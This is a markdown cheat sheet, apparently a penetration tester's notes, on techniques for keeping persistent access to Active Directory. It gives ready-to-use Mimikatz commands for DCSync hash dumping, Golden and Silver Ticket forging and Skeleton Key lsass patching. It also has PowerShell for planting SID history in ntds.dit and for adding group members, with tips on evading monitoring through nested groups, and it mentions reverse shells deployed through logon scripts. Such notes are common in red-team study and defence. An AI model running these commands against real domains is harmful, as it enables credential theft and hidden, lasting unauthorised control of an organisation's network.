---
title: Active Directory persistence
---

- [1. DC Sync](#1-dc-sync)
- [2. Golden Ticket](#2-golden-ticket)
- [3. Silver Ticket](#3-silver-ticket)
- [4. Skeleton Key](#4-skeleton-key)
- [5. Certificates](#5-certificates)
- [6. Group Membership](#6-group-membership)
- [7. SID History](#7-sid-history)
- [8. Group Templates](#8-group-templates)
- [9. GPO](#9-gpo)

## 1. DC Sync
The more privileged credentials are, the sonner they will be rotated after breach detection. The goal then is to persist with near-privileged credentials, not with a super-user:

- Local administrator on several machines - usually there is a group or two with local admin rights on almost all machines.
- Service accounts with delegation permissions - with this accounts it's possible to force golden and silver tickets to perform Kerberos delegation attacks.
- Privileged AD services accounts

It is not just the DCs that can initiate DC Synchronization. Accounts such as those belonging to the _Domain Admins_ groups can also do it for legitimate purposes such as creating a new domain controller. If our account has permission to perform DC Synchronization, we can stage a DC Sync attack to harvest credentials from a DC.

```powershell
.\mimikatz.exe

# Dump for single user
> lsadump::dcsync /domain:<DOMAIN> /user:<AD_USERNAME>

# Dump all users to the file
> log <DUMP_FILE.TXT>
> lsadump::dcsync /domain:<DOMAIN> /all
```

## 2. Golden Ticket
_Golden Ticket_ is forged TGT of high privileged account. The authorization step is bypassed. Having a valid TGT of a privileged account, an attacker can request a TGS for almost any service. DC doesn't perform user account validation until the TGT is older than 20 minutes so a revoked account can be used as well. User's password change has no effect on this attack.

In order to forge a golden ticket `krbtgt` account's password hash is required. With this hash an attacker can sign a TGT for any user account. By default, the `krbtgt` account's password never changes, meaning once hacked, unless it is manually rotated, it's possible to generate TGTs forever.

Required information to forge Golden Ticket:

- `krbtgt` account's password hash
- domain name
- domain SID
- user ID

> **NOTE**: `krbtgt` hash is an NT (RC4 + HMAC) hash. It can be extracted from the lsass or a SAM file of a Domain Controller.

```powershell
# Mimikatz - forge Golden Ticket
> kerberos::golden /user:<ACCOUNT> /domain:<DOMAIN_FQDN> /id:500 /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_NT> /endin:600 /ptt

# Check if it works
dir \\dc\C$\
```

Structure of the Mimikatz command:

```plaintext
kerberos::golden        - Mimikatz module
/user:<ACCOUNT>         - User for which the TGT is generated
/domain:<DOMAIN_FQDN>   - Domain FQDN
/sid:<DOMAIN_SID>       - Domain SID
/krbtgt:<KRBTGT_NT>     - krbtgt's NT hash. Other: /aes128, /aes256
/endin:<INT>            - ticket lifetime in minutes (10 years by default)
/ptt                    - pass-the-ticket (inject into memory). Other: /ticket (save to the file)
```

## 3. Silver Ticket
_Silver Ticket_ is forged TGS which gives an access to some interesting service. TGS is encrypted using service account's NT hash so it needs to be extracted first. TGS is valid only for the services running with the same service account.

Usually, a machine account is used as a service account in the most interesting services. That's why the machine account's NT hash is the most desired one.  

**Which service to choose?**. Check out [the list of known SPNs](https://adsecurity.org/?page_id=183). Interesting ones:

- `cifs` - allows file system access.
- `host` - task scheduling ability.

```powershell
# Mimikatz - forge Silver Ticket
> kerberos::golden /user:<ACCOUNT> /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<DOMAIN> /rc4:<SERVICE_ACCOUNT_NT_HASH> /service:<SERVICE_SPN> /ptt
```

Structure of the Mimikatz command is very similar to the Golden Ticket variant:

```plaintext
kerberos::golden        - Same as for Golden Ticket. No Silver module.
/service:<SERVICE>      - SPN name of the service
/rc4:<HASH>             - Service account hash. Other: /aes128, /aes256
/ptt                    - pass-the-ticket into memory. No option to save the ticket on disk.
```

## 4. Skeleton Key
It's a technique that uses patching of the lsass process memory in a Domain Controller in order to allow access as any user using a single password. It's not persistent across reboots. Domain Admin privileges are required to patch lsass memory!

> **NOTE**: It's not possible to patch the lsass twice.

```powershell
# Mimikatz - change all users passwords to "mimikatz"
> privilege::debug misc::skeleton
```

## 5. Certificates
TBD

## 6. Group Membership
We can just add ourselves directly to privileged AD groups for persistence.  Remember, the most privileged groups are not always the best to use for persistence. They are always monitored. In large organizations groups are usually nested. Groups contain groups and so on. For example, an interesting "IT Support" group might have multiple subgroups with the same privileges. Here's the reduced visibility for monitoring systems. It can be exploited to achive more silent persistence.

```powershell
# Add group member
Add-ADGroupMember -Identity <GROUP> -Members <USER>
```

## 7. SID History
SIDs history of Security Principal allows for one account to be attached to another. It basically have all the privileges of the SIDs included in the SID history. It's especially used during migration, when a new account on a new domain could have the SID history of an old account to retain access of the old domain.

It might be used in order to establish persistence in the domain. Groups' SIDs can be assigned to a user's SID history as well. This technique is a lot harder to detect than just a simple group membership persistence.

```powershell
# Get SID history
Get-ADUser <USER> -Properties name,sidhistory

# Get group's SID
Get-ADGroup <GROUP>

# Modify SID history
Import-Moduls DSInternals
Stop-Service ntds -Force
Add-ADDBSidHistory -SamAccountName <USER> -SidHistory <SID> -DatabasePath 'C:\Windows\NTDS\ntds.dit'
Start-Service ntds
```

## 8. Group Templates
Group templates are objects which privileges are copied to some AD groups constantly (e.g. every hour). `SDProp` process takes the ACL of the `AdminSDHolder` object and applies it to all protected groups every 60 minutes. List of protected groups contains: `Administrators`, `Domain Admins`, `Schema Admins`, `Enterprise Admins` and more. By default, `AdminSDHolder` ACL is very restrictive. By modifing ACL of this object (injecting special ACEs), an attacker can change ACLs of all protected groups in the domain and gain full permissions to them.  

## 9. GPO
GPOs are excellent tool for remote management but they can be targeted to deploy persistence. Some GPO hooks are especially interesting from the attacker's point of view:

- `Restricted Group Membership` - allows to give administrative access to all hosts in the domain.
- `Logon Script Deployment` - allows to execute script (e.g. reverse shell) on every logon.
- and more.
